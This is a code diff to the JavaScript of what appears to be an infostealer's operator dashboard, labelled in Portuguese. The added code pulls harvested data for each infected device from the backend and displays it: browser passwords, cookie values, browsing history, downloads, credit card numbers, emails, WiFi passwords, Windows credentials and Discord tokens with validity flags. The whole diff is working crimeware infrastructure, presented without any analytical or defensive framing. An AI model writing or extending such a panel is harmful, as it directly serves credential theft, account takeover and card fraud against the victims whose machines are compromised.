@@ -555,50 +555,223 @@
             const modal = document.getElementById('dataModal');
             const dataDiv = document.getElementById('modalData');
             document.getElementById('modalTitle').textContent = 'Dados do Dispositivo: ' + id;
-            dataDiv.innerHTML = '<div class="empty">Buscando requisições do webhook...</div>';
+            dataDiv.innerHTML = '<div class="empty">Carregando dados...</div>';
             modal.style.display = 'block';
 
             try {
-                const keys = [
-                    {url: '/api/passwords_data', title: 'Senhas', parser: d => `[${d.browser || 'Browser'}] ${d.url || d.target} | <b>User:</b> ${d.username || 'N/A'} | <b>Pass:</b> <span style="color:#a855f7">${d.password}</span>`},
-                    {url: '/api/cookies_data', title: 'Cookies Ativos', parser: d => `[${d.browser || 'Browser'}] ${d.host} | ${d.name}`},
-                    {url: '/api/history_data', title: 'Histórico de Navegação', parser: d => `[${d.browser || 'Browser'}] <a href="${d.url}" target="_blank" style="color:#fff">${d.title || d.url}</a> (${d.visit_count} visitas)`},
-                ];
+                // Fetch todas as categorias de dados em paralelo
+                const [
+                    passwordsRes, cookiesRes, historyRes, downloadsRes, 
+                    cardsRes, emailsRes, wifiRes, sysPwdRes, sysInfoRes
+                ] = await Promise.all([
+                    fetch('/api/passwords_data'),
+                    fetch('/api/cookies_data'),
+                    fetch('/api/history_data'),
+                    fetch('/api/downloads_data'),
+                    fetch('/api/cards_data'),
+                    fetch('/api/emails_data'),
+                    fetch('/api/wifi_data'),
+                    fetch('/api/system_passwords_data'),
+                    fetch(`/api/system_info_data/${id}`)
+                ]);
 
                 let html = '';
-                
-                for(const k of keys) {
-                    const res = await fetch(k.url);
-                    if(res.ok) {
-                        const items = await res.json();
-                        const myItems = items.filter(x => x.endpoint_id === id);
+
+                // 1. INFORMAÇÕES DO SISTEMA
+                if (sysInfoRes.ok) {
+                    const sysInfo = await sysInfoRes.json();
+                    if (Object.keys(sysInfo).length > 0) {
                         html += `
                         <div class="data-section">
-                            <h3>${k.title} <span style="font-size:0.7em; color:#666">(${myItems.length})</span></h3>
-                            <div style="font-family: 'Inter', monospace; font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
-                                ${myItems.map(d => '<div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">' + k.parser(d) + '</div>').join('') || '<div style="color:#666; font-style:italic">Nenhum dado recebido do client ainda.</div>'}
+                            <h3>🖥️ Informações do Sistema</h3>
+                            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; font-size:0.85em; color:#ccc;">
+                                <div><b>Hostname:</b> ${sysInfo.hostname || 'N/A'}</div>
+                                <div><b>Usuário:</b> ${sysInfo.user || 'N/A'}</div>
+                                <div><b>Plataforma:</b> ${sysInfo.platform || 'N/A'} ${sysInfo.platform_release || ''}</div>
+                                <div><b>RAM:</b> ${sysInfo.ram || 'N/A'}</div>
+                                <div><b>IP Local:</b> ${sysInfo.ip_address || 'N/A'}</div>
+                                <div><b>IP Externo:</b> ${sysInfo.external_ip || 'N/A'}</div>
+                                <div><b>CPU:</b> ${sysInfo.processor || 'N/A'} (${sysInfo.cpu_count || 0} cores)</div>
+                                <div><b>Arquitetura:</b> ${sysInfo.architecture || 'N/A'}</div>
                             </div>
                         </div>`;
                     }
                 }
-                
-                // Fetch metrics/tokens specific
-                const resM = await fetch('/api/metrics');
-                if(resM.ok) {
-                    const metrics = await resM.json();
-                    const myMetrics = metrics.filter(x => x.endpoint_id === id);
+
+                // 2. SENHAS DE NAVEGADOR
+                if (passwordsRes.ok) {
+                    const passwords = await passwordsRes.json();
+                    const myPasswords = passwords.filter(x => x.endpoint_id === id);
                     html += `
                     <div class="data-section">
-                        <h3>Tokens do Discord <span style="font-size:0.7em; color:#666">(${myMetrics.length})</span></h3>
-                        <div style="font-family: monospace; font-size: 0.85em; color: #fff;">
-                            ${myMetrics.map(m => '<div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">' + m.token + ' <span style="color:#666">(' + m.source + ')</span></div>').join('') || '<div style="color:#666; font-style:italic">Nenhum token encontrado.</div>'}
+                        <h3>🔑 Senhas de Navegador <span style="font-size:0.7em; color:#666">(${myPasswords.length})</span></h3>
+                        <div style="font-family: 'Inter', monospace; font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
+                            ${myPasswords.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    [${d.browser || 'Browser'}] ${d.url || d.target || 'N/A'} | 
+                                    <b>User:</b> ${d.username || 'N/A'} | 
+                                    <b>Pass:</b> <span style="color:#a855f7">${d.password || 'N/A'}</span>
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhuma senha recebida.</div>'}
                         </div>
                     </div>`;
                 }
 
-                dataDiv.innerHTML = html;
-            } catch(e) {
-                dataDiv.innerHTML = '<div class="empty" style="color:#ff4444">Erro ao carregar dados remotos do Banco. Verifique se a aplicação está online.</div>';
+                // 3. COOKIES
+                if (cookiesRes.ok) {
+                    const cookies = await cookiesRes.json();
+                    const myCookies = cookies.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>🍪 Cookies Ativos <span style="font-size:0.7em; color:#666">(${myCookies.length})</span></h3>
+                        <div style="font-family: monospace; font-size: 0.8em; color: #ccc; max-height: 250px; overflow-y: auto;">
+                            ${myCookies.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    [${d.browser || 'Browser'}] ${d.host || 'N/A'} | ${d.name || 'N/A'} = ${(d.value || '').substring(0, 50)}${(d.value || '').length > 50 ? '...' : ''}
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum cookie recebido.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 4. HISTÓRICO
+                if (historyRes.ok) {
+                    const history = await historyRes.json();
+                    const myHistory = history.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>📜 Histórico de Navegação <span style="font-size:0.7em; color:#666">(${myHistory.length})</span></h3>
+                        <div style="font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
+                            ${myHistory.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    [${d.browser || 'Browser'}] 
+                                    <a href="${d.url}" target="_blank" style="color:#fff; text-decoration:none;">${d.title || d.url || 'N/A'}</a>
+                                    ${d.visit_count ? `(${d.visit_count} visitas)` : ''}
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum histórico recebido.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 5. DOWNLOADS
+                if (downloadsRes.ok) {
+                    const downloads = await downloadsRes.json();
+                    const myDownloads = downloads.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>⬇️ Downloads <span style="font-size:0.7em; color:#666">(${myDownloads.length})</span></h3>
+                        <div style="font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
+                            ${myDownloads.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    [${d.browser || 'Browser'}] 
+                                    <b>Arquivo:</b> ${d.target_path || d.TargetPath || 'N/A'}<br>
+                                    <b>URL:</b> <a href="${d.url || d.URL}" target="_blank" style="color:#888; font-size:0.9em;">${(d.url || d.URL || 'N/A').substring(0, 60)}...</a>
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum download recebido.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 6. CARTÕES DE CRÉDITO
+                if (cardsRes.ok) {
+                    const cards = await cardsRes.json();
+                    const myCards = cards.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>💳 Cartões de Crédito <span style="font-size:0.7em; color:#666">(${myCards.length})</span></h3>
+                        <div style="font-family: monospace; font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
+                            ${myCards.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    [${d.browser || 'Browser'}] 
+                                    <b>Número:</b> ${d.number || d.Number || '****'} | 
+                                    <b>Nome:</b> ${d.name || d.Name || 'N/A'} | 
+                                    <b>Exp:</b> ${d.expiration_month || d.ExpirationMonth || '**'}/${d.expiration_year || d.ExpirationYear || '****'}
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum cartão recebido.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 7. EMAILS
+                if (emailsRes.ok) {
+                    const emails = await emailsRes.json();
+                    const myEmails = emails.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>📧 Emails do Sistema <span style="font-size:0.7em; color:#666">(${myEmails.length})</span></h3>
+                        <div style="font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
+                            ${myEmails.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    ${d.email}
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum email encontrado.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 8. SENHAS WIFI
+                if (wifiRes.ok) {
+                    const wifi = await wifiRes.json();
+                    const myWifi = wifi.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>📶 Senhas WiFi <span style="font-size:0.7em; color:#666">(${myWifi.length})</span></h3>
+                        <div style="font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
+                            ${myWifi.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    <b>SSID:</b> ${d.ssid || 'N/A'} | 
+                                    <b>Senha:</b> <span style="color:#a855f7">${d.password || 'N/A'}</span>
+                                    ${d.authentication ? `| <b>Auth:</b> ${d.authentication}` : ''}
+                                    ${d.encryption ? `| <b>Crypto:</b> ${d.encryption}` : ''}
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhuma senha WiFi recebida.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 9. SENHAS DO SISTEMA (Windows Credentials)
+                if (sysPwdRes.ok) {
+                    const sysPwds = await sysPwdRes.json();
+                    const mySysPwds = sysPwds.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>🔐 Credenciais do Windows <span style="font-size:0.7em; color:#666">(${mySysPwds.length})</span></h3>
+                        <div style="font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
+                            ${mySysPwds.map(d => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    <b>Target:</b> ${d.target || d.Target || 'N/A'} | 
+                                    <b>Usuário:</b> ${d.username || d.Username || 'N/A'} | 
+                                    <b>Senha:</b> <span style="color:#a855f7">${d.password || d.Password || 'N/A'}</span>
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhuma credencial do sistema recebida.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                // 10. TOKENS DO DISCORD (do /api/metrics)
+                const tokensRes = await fetch('/api/metrics');
+                if (tokensRes.ok) {
+                    const metrics = await tokensRes.json();
+                    const myTokens = metrics.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>🔑 Tokens do Discord <span style="font-size:0.7em; color:#666">(${myTokens.length})</span></h3>
+                        <div style="font-family: monospace; font-size: 0.85em; color: #fff;">
+                            ${myTokens.map(m => `
+                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
+                                    ${m.token} 
+                                    <span style="color:#666">(${m.source || 'N/A'})</span>
+                                    ${m.valid ? '<span style="color:#22c55e">✓ Válido</span>' : '<span style="color:#ef4444">✗ Inválido</span>'}
+                                </div>
+                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum token encontrado.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                dataDiv.innerHTML = html || '<div class="empty">Nenhum dado disponível para este endpoint.</div>';
+            } catch (e) {
+                console.error('Erro:', e);
+                dataDiv.innerHTML = '<div class="empty" style="color:#ff4444">Erro ao carregar dados. Verifique se o endpoint está online.</div>';
             }
         }
         
